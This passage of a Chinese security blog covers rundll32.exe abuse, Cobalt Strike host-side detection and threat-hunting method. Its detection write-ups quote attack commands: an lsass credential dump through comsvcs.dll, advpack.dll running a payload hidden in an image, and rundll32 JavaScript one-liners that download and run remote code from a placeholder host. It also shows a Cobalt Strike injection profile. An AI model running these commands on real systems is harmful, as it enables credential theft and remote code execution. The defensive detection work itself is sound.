实现的攻击方式非常多，这里我只简单介绍几种比较有特色的利用姿势</p><h4 id="合法的DLL调用"><a href="#合法的DLL调用" class="headerlink" title="合法的DLL调用"></a>合法的DLL调用</h4><p>攻击者如果使用合法的 DLL 文件来完成攻击活动，按照传统的检测手段，确实会大大增加防守难度</p><p>例如利用 comsvcs.dll 中的 MiniDump 函数对目标进程进行内存转储，从而实现凭证窃取，参考<a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs.dll">这里</a>：</p><ul><li><code>C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump &lt;PID&gt; C:\temp\lsass.dmp full</code></li></ul><p><img src="http://photo.moofeng.cn/typora/comsvcsdll.png" alt="comsvcsdll"></p><p>类似的还有 advpack.dll，原本是用于帮助硬件和软件读取和验证.INF文件，也会被攻击者用做代码执行</p><p>印象比较深刻的是之前分析一些木马病毒时见过类似的使用技巧，特意搜了下，这里好像也有相关<a href="https://www.anquanke.com/post/id/97329/">文章</a>：</p><p><img src="http://photo.moofeng.cn/typora/image-20211212122220294.png" alt="image-20211212122220294"></p><p>该病毒在图片中存放恶意代码，通过白利用完成代码执行，不熟悉的小伙伴遇见了真的很容易被瞒过去：</p><ul><li><code>c:\windows\system32\rundll32.exe advpack.dll,LaunchINFSection c:\microsoft\360666.png,DefaultInstall</code></li></ul><p>当然，这些攻击手法在实际使用过程中肯定会有许多变种，用于绕过一些常规的检测方式，比如 MiniDump 函数的调用也可以通过编号 #24 完成</p><p>感兴趣的朋友可以看看<a href="http://www.hexacorn.com/blog/2020/02/05/stay-positive-lolbins-not/">这里</a>：</p><p><img src="http://photo.moofeng.cn/typora/image-20211210165706725.png" alt="image-20211210165706725"></p><h4 id="远程代码加载"><a href="#远程代码加载" class="headerlink" title="远程代码加载"></a>远程代码加载</h4><p>除了本地加载之外，rundll32.exe 也可以通过 RunHtmlApplication 函数执行 JavaScript 以实现远程代码加载，例如：</p><ul><li><p><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip:port/&#39;);&quot;</code></p></li><li><p><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://raw.githubusercontent.com/XXX/XXX&quot;)</code></p></li></ul><p><img src="https://pbs.twimg.com/media/BtNtpPRCAAAHmAy?format=png&name=900x900" alt="图像"></p><p>值得一提的是，根据笔者的观察，目前还没怎么看到日常活动中关于 javasciprt 关键字的合理使用场景，所以通常我会直接将该特征加入检测规则清单</p><p>关于该攻击手法，更多内容可以看看这篇<a href="https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/">文章</a></p><h4 id="滥用COM组件"><a href="#滥用COM组件" class="headerlink" title="滥用COM组件"></a>滥用COM组件</h4><p>关于 rundll32.exe 还有一些比较少见的命令行参数 ———— <code>-sta</code> 和 <code>-localserver</code>，它们俩都能用来加载恶意注册的 COM 组件</p><p>登上自家的 SIEM 去看看，说不定也能够发现以下活动(至少我确实根据相关数据狩猎到了一些有意思的活动:P)</p><ul><li><code>rundll32.exe –localserver &lt;CLSID_GUID&gt;</code></li><li><code>rundll32.exe –sta &lt;CLSID_GUID&gt;</code></li></ul><p>对 COM 组件不熟悉的童鞋可能需要先得去补补课，比如 ATT&amp;CK 在持久化阶段中提及到的 <a href="https://attack.mitre.org/techniques/T1546/015/">T1546.015-Component Object Model Hijacking</a></p><p>简单来讲，当我们看到类似的命令行参数时，最好先去看看对应注册表下的键值对是否包含恶意的 DLL 文件或 SCT 脚本</p><p>它们通常在这个位置：<code>\HKEY_CLASSES_ROOT\CLSID\&lt;GUID&gt;</code>，可结合下图食用</p><p><img src="http://photo.moofeng.cn/typora/rundll32_sta.png" alt="img"></p><p>关于具体的利用原理和攻击细节可以看看<a href="https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/">这里</a>，还有这篇<a href="https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/">文章</a>中提到的使用 <code>-localserver</code> 作为攻击变种的使用姿势</p><h3 id="检测技巧"><a href="#检测技巧" class="headerlink" title="检测技巧"></a>检测技巧</h3><h4 id="命令行检测"><a href="#命令行检测" class="headerlink" title="命令行检测"></a>命令行检测</h4><p>首先让我们一起回顾一遍 rundll32.exe 的基本使用方法：</p><ul><li><code>rundll32.exe &lt;dllname&gt;,&lt;entrypoint&gt; &lt;optional arguments&gt;</code></li></ul><p>从 rundll32 的文件位置开始，我们可以设定一条最基础的检测规则，因为它通常只有以下两种选择：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">C:\Windows\System32\rundll32.exe</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">C:\Windows\SysWOW64\rundll32.exe</span> <span class="hljs-string">(32bit</span> <span class="hljs-string">version</span> <span class="hljs-string">on</span> <span class="hljs-string">64bit</span> <span class="hljs-string">systems)</span><br></code></pre></td></tr></table></figure><p>虽然简单，但也不并一定完全无用武之地：</p><p><img src="http://photo.moofeng.cn/typora/image-20211212155002278.png" alt="image-20211212155002278"></p><p>接着，让我们开始关注 DLL 文件和导出函数</p><p>通过前文的介绍，我们应该能达成共识：在日常活动中，rundll32.exe 的出场次数并不少见</p><p>对于这种可能存在较多干扰信息的情况，我习惯使用漏斗模型来帮助缩小检测范围，简单来讲就是尽你所能(不一定非得用UEBA)去建设行为基线，然后剔除正常活动，重点关注偏离动作</p><p>例如，我简单统计了下自己电脑上出现过的 DLl 文件和导出函数，我们可以</p><p><img src="http://photo.moofeng.cn/typora/image-20211215011759719.png" alt="image-20211215011759719"></p><p>在生产环境中，对于行为基线之外的活动，仍然可能包含大量业务相关的正常行为，这时还可以加上长尾分析法，关注特定阈值之下的少数可疑行为</p><p>或者我们还可以检查下有哪些不规范的文件或者函数名，比如这里我只简单设置条件为未包含关键字 “.dll”</p><p>对于之前提过 CobaltStrike 在后渗透阶段调用 rundll32.exe 的方式，就可以很轻松地通过这一技巧检测出来</p><p><img src="http://photo.moofeng.cn/typora/image-20211215012621539.png" alt="image-20211215012621539"></p><p>另外，其实我印象比较深刻的是以前使用该技巧发现过这么一起异常行为：<code>rundll32.exe uwcidcx.vb,capgj</code></p><p>当时只是觉得可疑，还不敢直接定性，直到写这篇文章时，在 Red Canary 的报告中发现了类似的攻击活动，且有着相同的上下文特征，才得以确认为某后门病毒</p><p>当然，这种方法可能会存在漏报，所以需要结合后文中的其它检测点搭配食用</p><h4 id="敏感函数监测"><a href="#敏感函数监测" class="headerlink" title="敏感函数监测"></a>敏感函数监测</h4><p>前面介绍过一些使用合法的 DLL 文件及其函数完成的攻击活动，这种特定的白利用行为就需要我们重点关注了</p><p>例如 MiniDump 与其对应的函数编号 #24，其它更多的 tips 可能需要请红队成员帮帮忙，毕竟术业有专攻嘛</p><p>还有 javascript 的用法，因为它在日常行为中非常罕见，所以也可以享受下特殊待遇，加入观察名单</p><p>当然，有些特殊行为我们无法一眼定性，这时往往需要安全人员进行人工判定</p><p>对于这种场景，我们可以针对这些敏感的函数调用行为建设相应的 dashboard</p><p>例如上文提到的 <code>-sta</code> 关键字的用法，我们可能不方便根据 GUID 完成自动化研判，但是可以通过这种方式提高狩猎效率</p><h4 id="通信行为监测"><a href="#通信行为监测" class="headerlink" title="通信行为监测"></a>通信行为监测</h4><p>根据我的观察经验，rundll32 在网络通信行为上的花样并不多，这对于我们建立异常检测模型是非常有利的</p><p>我在自己的主机上统计了下，只有实验中 beacon 通信时留下了 rundll32 的网络通信日志</p><p>当然，实验环境的数据没有说服力，而且我自己也维护了一份白名单，这里只是演示下统计方式，大家可以在自己的环境中去试一试</p><p><img src="http://photo.moofeng.cn/typora/image-20211214232400479.png" alt="image-20211214232400479"></p><p>如果有 EDR 在进程通信时能采集到相应的命令行日志，我们还可以结合进程和网络行为一起分析</p><p>而通常情况下我们的日志中可能会缺少这些字段(例如sysmon)，没关系，这时我们就一切从简</p><p>比如直接结合威胁情报食用，调用 API 查询 rundll32.exe 的目的地址是否可疑</p><p>另外，如果 rundll32.exe 存在扫描行为或者访问特殊端口(例如445、数据库端口等)，这种情况应该不用多讲了吧(PS：我还真遇过好几次)</p><p>要是还想玩点高级的，可以结合通信频率，学习下检测 beacon 的姿势，比如根据 jitter 特征检测 C2 通信，参考这篇<a href="https://posts.bluraven.io/enterprise-scale-threat-hunting-network-beacon-detection-with-unsupervised-ml-and-kql-part-2-bff46cfc1e7e">文章</a></p><h4 id="异常关系检测"><a href="#异常关系检测" class="headerlink" title="异常关系检测"></a>异常关系检测</h4><p>这部分可能涉及到的攻击手法就比较多样了，比如钓鱼邮件、webshell、计划任务或WMI等持久化中都有可能用到 rundll32.exe</p><p>所以需要对相关进程间的父子关系列一份检测清单，例如以下进程就应该划上重点：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>winword.exe<br><span class="hljs-bullet">- </span>excel.exe<br><span class="hljs-bullet">- </span>taskeng.exe<br><span class="hljs-bullet">- </span>winlogon.exe<br><span class="hljs-bullet">- </span>schtask.exe<br><span class="hljs-bullet">- </span>regsvr32.exe<br><span class="hljs-bullet">- </span>wmiprvse.exe<br><span class="hljs-bullet">- </span>wsmprovhost.exe<br>...<br></code></pre></td></tr></table></figure><p>而对于清单内的进程，我们还可以借助图数据来构建 dashboard，如果有个专门的模块能够记录这些罕见的进程链，监测时便是一目了然</p><p><img src="http://photo.moofeng.cn/typora/image-20211215013919700.png" alt="image-20211215013919700"></p><p>当然，有机会的话，也别漏掉了一些特殊的访问关系，比如 rundll32.exe 对 lsass.exe 发起高权限的进程间访问</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>最后，这篇文章中贴的相关链接比较多，大部分都需要翻出去才能访问，所以如果遇到无法访问的情况其实是正常现象</p><p>有些地方的贴图不方便展示真实数据，只能贴网图或者在实验环境下截图，显示的数据样本会比较小，但是文中的结论实际上有大量样本支撑，基本可以放心食用</p><p>如有纰漏之处，或者其他有意思的发现，欢迎私信交流~~</p>]]></content>
    
    
    <categories>
      
      <category>安全攻防</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基于异常行为检测CobaltStrike</title>
    <link href="/posts/3935393422/"/>
    <url>/posts/3935393422/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在很多攻击活动中，我们都能看到 <strong>CobaltStrike</strong> 的身影，所以，对于防御者，了解其在各个攻击阶段的行为特征是非常有必要的</p><p>上篇文章——<a href="https://www.anquanke.com/post/id/260494">《威胁狩猎的最佳实践》</a>里提过一些检测方法，本文正好以CS为例，介绍下behavior-based的检测手段</p><p>全文结构参考ATT&amp;CK攻击框架展开，主要涉及CS内置或者常用的使用姿势，检测思路仅供参考</p><h3 id="攻击阶段"><a href="#攻击阶段" class="headerlink" title="攻击阶段"></a>攻击阶段</h3><h4 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h4><p>CS中有很多用于后渗透的攻击模块，它们的加载通常是借助调用Windows DLL的方式来实现</p><p>这意味着攻击者在使用这些内置工具的时候，CS会临时拉起一个进程并使用rundll32.exe实现恶意代码注入</p><p>更重要的是，为了传递输出信息，这些攻击模块会通过<strong>命名管道</strong>(named pipe)的形式与beacon产生通信</p><p>通常情况下，CS会采用以下默认的风格给管道进行命名：</p><ul><li>\postex_*</li><li>\postex_ssh_*</li><li>\status_*</li><li>\msagent_*</li><li>\MSSE-*</li><li>*-server</li></ul><p>当然，攻击者能够自行修改命名方式，不过这一点容易被很多人忽视，大家也可以检视下自己平上时有没有这样的习惯，更多内容请参考<a href="https://blog.cobaltstrike.com/2021/02/09/learn-pipe-fitting-for-all-of-your-offense-projects/">官方文章</a></p><p>那么站在防御者的视角，我们可以使用 <strong>sysmom</strong> 等日志采集工具观测到以下行为：</p><p><img src="http://photo.moofeng.cn/typora/image-20211205133529299.png" alt="image-20211205133529299"></p><p>除了关注管道的命名风格，CS在利用rundll32.exe进行代码注入的过程中，也有一定的行为特征，比如下图中的父子进程关系和参数调用：</p><p><img src="http://photo.moofeng.cn/typora/image-20211205133914917.png"></p><p>虽然我们的操作系统在日常活动中也会经常用到rundll32.exe，但这里有所不同的是——它被调用时不带任何参数，这种调用过程同样值得防守方加以关注</p><p>对于windows上这类常见的系统进程，日后我会再专门写些文章去深入分析它们的行为基线，此处留个坑先…</p><h4 id="Defense-Evasion"><a href="#Defense-Evasion" class="headerlink" title="Defense Evasion"></a>Defense Evasion</h4><p>在这一攻击阶段，CS中最常用的手法就是<strong>进程注入</strong>(process injection)</p><p>例如通过远程代码注入伪装成svchost.exe，或者注入lsass.exe后从内存中提取访问凭证</p><p>要想达到优秀的检测效果，我们最好双管齐下，一是理解攻击原理，二是理解日志记录的原理</p><p>关于CS实现进程注入的过程，可以参考官方的这段<a href="https://www.cobaltstrike.com/help-malleable-postex#processinject">说明</a>，这里我拿其中的配置文件为例：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-string">process-inject</span> &#123;<br><span class="hljs-comment"># set how memory is allocated in a remote process</span><br><span class="hljs-string">set</span> <span class="hljs-string">allocator</span> <span class="hljs-string">&quot;VirtualAllocEx&quot;</span><span class="hljs-string">;</span><br><br><span class="hljs-comment"># shape the memory characteristics and content</span><br><span class="hljs-string">set</span> <span class="hljs-string">min_alloc</span> <span class="hljs-string">&quot;16384&quot;</span><span class="hljs-string">;</span><br><span class="hljs-string">set</span> <span class="hljs-string">startrwx</span>  <span class="hljs-string">&quot;true&quot;</span><span class="hljs-string">;</span><br><span class="hljs-string">set</span> <span class="hljs-string">userwx</span>    <span class="hljs-string">&quot;false&quot;</span><span class="hljs-string">;</span><br><br><span class="hljs-string">transform-x86</span> &#123;<br><span class="hljs-string">prepend</span> <span class="hljs-string">&quot;\x90\x90&quot;</span><span class="hljs-string">;</span><br>&#125;<br><br><span class="hljs-string">transform-x64</span> &#123;<br><span class="hljs-comment"># transform x64 injected content</span><br>&#125;<br><br><span class="hljs-comment"># determine how to execute the injected code</span><br><span class="hljs-string">execute</span> &#123;<br><span class="hljs-string">CreateThread</span> <span class="hljs-string">&quot;ntdll.dll!RtlUserThreadStart&quot;</span><span class="hljs-string">;</span><br><span class="hljs-string">SetThreadContext;</span><br><span class="hljs-string">RtlCreateUserThread;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参考上述执行流程，我们可以将其分解成四步：</p><ol><li>获取远程进程的句柄</li><li>在远程进程中开辟内存空间</li><li>将shellcode复制到远程进程</li><li>在远程进程中执行shellcode</li></ol><p>结合sysmon的监测能力，先拿两类日志为例吧：EID 8 和 EID 10</p><p>在上述流程的第一步，使用OpenProcess获取进程句柄的活动会被sysmon记录成EID为10的日志</p><p>而该日志类型有两个字段值得我们关注——TargetImage和GrantedAccess</p><p>前者就是目标进程，后者与访问权限相关，不同位掩码代表的权限关系如下：</p><table><thead><tr><th>Access</th><th>Mask</th></tr></thead><tbody><tr><td>PROCESS_CREATE_PROCESS</td><td>0x0080</td></tr><tr><td>PROCESS_CREATE_THREAD</td><td>0x0002</td></tr><tr><td>PROCESS_DUP_HANDLE</td><td>0x0040</td></tr><tr><td>PROCESS_SET_INFORMATION</td><td>0x0200</td></tr><tr><td>PROCESS_SET_QUOTA</td><td>0x0100</td></tr><tr><td>PROCESS_QUERY_LIMITED_INFORMATION</td><td>0x1000</td></tr><tr><td>SYNCHRONIZE</td><td>0x00100000</td></tr><tr><td>PROCESS_QUERY_INFORMATION</td><td>0x0400</td></tr><tr><td>PROCESS_SUSPEND_RESUME</td><td>0x0800</td></tr><tr><td>PROCESS_TERMINATE</td><td>0x0001</td></tr><tr><td>PROCESS_VM_OPERATION</td><td>0x0008</td></tr><tr><td>PROCESS_VM_READ</td><td>0x0010</td></tr><tr><td>PROCESS_VM_WRITE</td><td>0x0020</td></tr></tbody></table><p>拿mimikatz使用过程中涉及到的权限为例：</p><table><thead><tr><th>Command</th><th>Sysmon 10</th><th>Security 4663 Kernel Object</th></tr></thead><tbody><tr><td>lsadump::lsa &#x2F;patch</td><td>GrantedAccess 0x1438</td><td>AccessMask 0x10</td></tr><tr><td>lsadump::lsa &#x2F;inject</td><td>rantedAccess 0x143a</td><td>AccessMask 0x10</td></tr><tr><td>lsadump::trust &#x2F;patch</td><td>GrantedAccess 0x1438</td><td>AccessMask 0x10</td></tr><tr><td>misc:memssp</td><td>GrantedAccess 0x1438</td><td>AccessMask 0x10</td></tr><tr><td>Procdump mimidump</td><td>GrantedAccess 0x1fffff</td><td>AccessMask 0x10</td></tr><tr><td>Task Manage minidump</td><td>GrantedAccess 0x1400, 0x1000, 0x1410 and 0x1fffff</td><td>AccessMask 0x10</td></tr><tr><td>sekurlsa::*</td><td>GrantedAccess 0x1010</td><td>AccessMask 0x10</td></tr></tbody></table><p>这其中，0x1fffff 较为惹人注目，其意味着被赋予了所有权限，而我们的CS在代码注入活动中正是这样表现的：</p><p><img src="http://photo.moofeng.cn/typora/image-20211205134610003.png" alt="image-20211205134610003"></p><p>到了进程注入的最后一步时，CS经常会调用 Win32 API CreateRemoteThreat，而这又会引起sysmon中日志类型ID为8的注意</p><p>这类日志不仅会记录API调用过程中的源进程和目标进程，还会记录新线程的起始地址和起始函数等信息</p><p>针对这一类行为的检测，同样可以从两方面入手，一是建立行为基线</p><p>生产环境中会调用 CreateRemoteThreat 的进程不多，常见的有反病毒程序和svchosts.exe、services.exe、wininit.exe等</p><p>参考 <a href="https://github.com/olafhartong/sysmon-modular">sysmonconfig.xml</a> 等配置文件，可以维护一份白名单，对基线外的异常行为加以关注</p><p>另一方面，日志中的 StartAddress 等字段同样能起到一些辅助作用，Olaf Hartong 以前针对这一检测点专门写过<a href="https://medium.com/@olafhartong/cobalt-strike-remote-threads-detection-206372d11d0f">文章</a></p><p>尽管在后续版本中有所变化，但是这一思路仍然能应用在检测技巧中提高相关进程行为的风险暴露程度</p><p><img src="http://photo.moofeng.cn/typora/image-20211205145000748.png" alt="image-20211205145000748"></p><p>当然，进程注入的方式非常多样，而EID 8只关注 **CreateRemoteThreat()**，所以这一监测方式并不总能奏效</p><p>但是该检测点仍然不失为一道重要的防线，通过下图可以较为直观地理解我们的布防位置：</p><p><img src="http://photo.moofeng.cn/typora/image57.png" alt="image57"></p><p>除了进程间访问和远程线程创建之外，被注入的进程可能会产生新的会话，与C2进行通信，这时还会有EID 22(DNS query)的记录</p><p>从整个执行流程来看，就是 EID 10 -&gt; EID 8 -&gt; EID 22，其中每个阶段还会或多或少有些特征</p><p>讲到这里，我又想给自己挖个坑了，这一攻击手法其实可以拆解成多个风险行为，结合适当的算法计算出多条风险路径，从而大幅提高告警精确性和置信度</p><p>除了传统检测方法中的 Clustering、Grouping 和 Stack Counting 等，其实还有很多技巧可以结合使用，往往能达到更优的效果 </p><h4 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h4><p>提权阶段，最常用的手法可能是借助 <code>getsystem</code> 命令，其原理和Meterpreter的getsystem命令类似</p><p>本质上都是通过命名管道实现令牌模拟(named pipe impersonation)，想要了解细节的小伙伴可以参考下这篇<a href="https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/">文章</a></p><p>这种方式依赖于 SeImpersonatePrivilege 的特权，因此前提是你的beacon已经具备Admin权限，而UAC Bypass的方式由于太过多样，这里就先暂且不表</p><p>还有一种方法是通过<code>elevate svc-exe [listener]</code>创建服务运行一个二进制的payload，从而获得 SYSTEM 权限</p><p>这一过程涉及到可执行文件的创建、系统服务的创建、注册表的修改、文件和服务的清除等步骤，检测点比较多，可以按照下列截图依次分解：</p><ul><li>创建管道 EID 17，注意进程路径(Image)和管道命名方式(PipeName)</li></ul><p><img src="http://photo.moofeng.cn/typora/image-20211205152530367.png" alt="image-20211205152530367"></p><ul><li>释放文件  EID 11，注意用户权限(SYSTE&lt;)、进程名称(Image)和文件名称(TargetFilename)</li></ul><p><img src="http://photo.moofeng.cn/typora/image-20211205152540259.png" alt="image-20211205152540259"></p><ul><li>创建服务，注册表行为 EID 12&amp;13，注意注册表位置和键值</li></ul><p><img src="http://photo.moofeng.cn/typora/image-20211205152636201.png" alt="image-20211205152636201"></p><ul><li>进程创建 EID 1，注意进程路径与命令参数(无参数)</li></ul><p><img src="http://photo.moofeng.cn/typora/image-20211205152902031.png" alt="image-20211205152902031"></p><ul><li>文件删除</li></ul><p>文件删除这一行为我在实验过程中没能采集到相应日志，期待有相关发现的小伙伴们可以Twitter私信我</p><p>但是理论上该可执行文件的执行后自删除行为也是非常有价值的一个检测点，尤其是结合文件路径和签名状态等信息</p><h4 id="Credential-Access"><a href="#Credential-Access" class="headerlink" title="Credential Access"></a>Credential Access</h4><p>当攻击者获取目标系统的高权限之后，往往需要透过lsass.exe进程获取访问凭证</p><p>这一阶段中更多的攻击手法就不再赘述了，仅以使用CS的 <code>hashdump</code> 命令从进程内存中窃取凭证为例</p><p>首先，我们需要对以 lsass.exe 为目标进程的相关行为加以关注：</p><p><img src="http://photo.moofeng.cn/typora/image-20211205162751077.png" alt="image-20211205162751077"></p><p>很显然，以  0x1fffff 权限访问 lsass.exe 的行为都应该引起我们的高度警惕</p><p>接着，我们可以通过源进程的GUID看看它还干过些什么，结合前文在Execution阶段的分析，我猜它至少创建过命名管道</p><p><img src="http://photo.moofeng.cn/typora/image-20211205162853211.png" alt="image-20211205162853211"></p><p>果然如此，不仅是创建管道，还有进程间的调用特征(rundll32无参数)，甚至还涉及到注册表相关的行为</p><p>这一阶段，结合攻击方要窃取的目标，防守方往往可以把注意力重点集结在 lsass.exe 等关键进程上，尤其会涉及到高权限的访问行为</p><p>只要做好数据采集和质量管理，在相关的必经之路上其实是易守难攻，这时的防守方反而能占据一些优势</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>受限于篇幅，其他攻击阶段譬如横向渗透、C2通信和内网探测之类的就不再展开举例了</p><p>目前网上关于 CobaltStrike 的检测大多集中在流量侧，关于后渗透阶段在主机侧的行为表现，希望本文能起到抛砖引玉的作用</p><p>尽管攻击方的绕过姿势花样迭出，但是一些关键行为路径仍然难以避免或者容易忽视，还有很多宝藏trick亟待挖掘</p>]]></content>
    
    
    <categories>
      
      <category>威胁狩猎</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>威胁狩猎的最佳实践</title>
    <link href="/posts/2246191620/"/>
    <url>/posts/2246191620/</url>
    
    <content type="html"><![CDATA[<h3 id="什么是威胁狩猎？"><a href="#什么是威胁狩猎？" class="headerlink" title="什么是威胁狩猎？"></a>什么是威胁狩猎？</h3><p>国内很多人都在谈论<strong>威胁狩猎</strong>(Threat Hunting)，但是很少有看到谁具体提及该怎么做和为什么要这样做</p><p>关于威胁狩猎，我挑选了一句个人认为最简洁有力的解释</p><blockquote><p>The process of proactively and iteratively searching through networks to detect and isolate advanced threats that evade existing security solutions.</p></blockquote><p>我们可以从中提炼出几个关键词 —— <strong>proactive</strong>(主动的) 、<strong>iterative</strong> (迭代的)和<strong>undetected</strong> (未被检测的) </p><p>简而言之，威胁狩猎就是主动发现潜伏在网络环境中尚未被发现的攻击活动，而这个过程需要不断地迭代进行</p><p>其目的是为了发现现有的安全解决方案或产品无法检测到的威胁，从而避免可能带来的巨大损失</p><h3 id="威胁狩猎全流程"><a href="#威胁狩猎全流程" class="headerlink" title="威胁狩猎全流程"></a>威胁狩猎全流程</h3><p><img src="https://photo.moofeng.cn/typora/image-20211130164604709.png"></p><h4 id="威胁假设"><a href="#威胁假设" class="headerlink" title="威胁假设"></a>威胁假设</h4><p>谈及威胁狩猎的流程，往往总离不开一个单词 ——<strong>hypothesis</strong>(假设)，或者我们可以理解成建设检测能力的驱动因素</p><p>通常有以下几种思路可以参考：</p><ul><li>业务驱动： 专注于特定类型客户的业务需求，例如银行、能源等行业</li><li>合规驱动： 需要满足或涵盖一些合规要求</li><li>攻击行为驱动： 期望覆盖攻击者常用的攻击手法，检测异常行为</li><li>黑客团伙驱动： 追踪特定黑客团体所使用的恶意工具、攻击手法等</li></ul><p>笔者的成长路线主要是参照第三种，长期专注于各类TTP(攻击手法)的检测</p><p>通常我会借助一些攻击模型来指导具体的研究路线，例如最爱也是最常用的MITRE的<strong>ATT&amp;CK攻击矩阵</strong></p><p><img src="http://photo.moofeng.cn/typora/image-20211119114349156.png" alt="image-20211119114349156"></p><p>当然还有<strong>Lockheed Martin’s Cyber Kill Chain</strong> 和<strong>FireEye’s Attack Lifecycle</strong> 等其它选择</p><p>选定攻击模型后，我们可以根据<strong>攻击流行度</strong>或<strong>防护薄弱点</strong>来选定具体的研究对象</p><p>以HW场景中常见的钓鱼邮件为例，参照ATT&amp;CK框架中的<a href="https://attack.mitre.org/techniques/T1566/001/">T1566.001</a>，可以做出以下威胁假设：</p><p>– <em>攻击者可能发送带有恶意附件的钓鱼邮件，诱导受害者点击从而获取对方的系统控制权限。</em></p><h4 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h4><p>有了狩猎目标，在开始进行分析和检测之前，还需要具体的攻击活动供我们研究</p><p>如果没有现成的恶意样本或数据，我们最好考虑借助工具来完成这一活动，不仅是为了方便复现，更是为了方便记录和共享</p><p>这里推荐两个我常用的项目——<strong>Atomic</strong>和<strong>Caldera</strong>：</p><ol><li><p><a href="https://github.com/redcanaryco/atomic-red-team/">https://github.com/redcanaryco/atomic-red-team/</a></p></li><li><p><a href="https://github.com/mitre/caldera">https://github.com/mitre/caldera</a></p></li></ol><p>前者适合个人研究使用，后者改一改还可以作为团队协作的BAS工具</p><p>以Atomic为例，根据ATT&amp;CK中对应的战术编号，我们很快便能找到对应的攻击模拟步骤</p><p><img src="http://photo.moofeng.cn/typora/image-20211120142251203.png" alt="image-20211120142251203"></p><p>而对于项目中没有的攻击技术，我们也可以按照规范自己开发出攻击脚本或插件，不断地填充这一弹药库</p><h4 id="分析取证"><a href="#分析取证" class="headerlink" title="分析取证"></a>分析取证</h4><p>有了攻击活动后，我们就需要掌握关键数据源，选择合适的角度去观测恶意行为</p><p>假如我们平时经常用到ATT&amp;CK模型，可以参考各种TTP所需的数据源做好相应的日志采集工作</p><p><img src="http://photo.moofeng.cn/typora/image.png" alt="image"></p><p>以上图为例，可见大多数TTP都会用到进程相关的数据，假设这里我们想要采集的日志类型为windows环境下的<strong>进程创建</strong></p><p>此时我们该如何选择数据源，或者说应该从哪些维度去评估数据源质量，保障其可追溯性</p><p>数据管理的具体流程又可以另起一篇文章了，这里我仅举个例子，将windows的4688和sysmon的1类日志在字段丰富性上做个对比：</p><p><img src="http://photo.moofeng.cn/typora/ProcessCreationTraceability_2.jpg" alt="ProcessCreationTraceability_2"></p><p>而对于不同类型的数据源，我们还要做好相应的数据解析和建模，这也属于数据管理的范畴</p><p>像我平常用到最多的是sysmon，那么关于sysmon采集的各事件类型和数据实体，理应做好文档管理并了然于胸</p><p><img src="http://photo.moofeng.cn/typora/FEFgdasXsAwcOFf.jpg" alt="FEFgdasXsAwcOFf"></p><p>透过数据建立逻辑，才能帮助我们更好地实现关联分析，对数据治理感兴趣地可以瞅瞅<a href="https://github.com/OTRF/OSSEM">OSSEM项目</a></p><h4 id="深入研究"><a href="#深入研究" class="headerlink" title="深入研究"></a>深入研究</h4><p>有了日志之后，也许我们很容易就能观测到一些较为明显的攻击特征，产出<strong>pattern-based</strong> 或<strong>behavior-based</strong> 类型的规则</p><p>但是要想尽可能地避免误报并提高检测质量，我们还得继续深入研究，这一步不仅需要洞察攻击原理，富化原始日志，而且还得运用一些高级的检测技巧</p><p>除了业内经常念叨的UEBA和机器学习，笔者更多地会习惯使用<strong>长尾分析</strong>和RBA(risk-based alerting)等手段来帮助发现未知威胁并提高检测置信度</p><p>还是以钓鱼邮件为例，在这个场景中，蓝队成员很容易能想到结合office软件进程，在可疑的网络请求、子进程和宏调用等检测点上下功夫</p><p>但是网络通信可以是白的，进程关系也可以绕过或伪造，宏更是很多办公人员不可或缺的功能，单凭这一点不足以产生告警</p><p>实验环境下，笔者借助splunk，使用类似RBA的检测手法生成了一段<strong>hyper query</strong>，有条件的可以在此基础上运用关联分析</p><p><img src="http://photo.moofeng.cn/typora/image-20211121124016727.png" alt="image-20211121124016727"></p><p>原理很简单，通过深入研究分解出钓鱼场景中各种可疑行为的特征，针对不同行为给予相应的分数，最后打分汇总，判定风险</p><h4 id="自动猎捕"><a href="#自动猎捕" class="headerlink" 